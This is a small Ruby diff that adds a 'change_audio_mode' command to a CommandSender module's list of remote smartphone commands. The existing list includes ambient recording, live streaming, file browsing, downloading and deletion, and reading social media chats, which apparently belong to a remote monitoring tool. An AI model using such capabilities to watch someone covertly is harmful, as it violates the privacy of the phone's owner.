@@ -29,7 +29,7 @@ module CommandSender
     ambient_record browse_files start_webrtc_stream
     list_files download_file upload_file delete_file preview_file
     rename_file move_file search_files upload_file_chunk
-    ping social_media_chats
+    ping social_media_chats change_audio_mode
   ].freeze
   
   def send_command_async(smartphone, command, params = {})
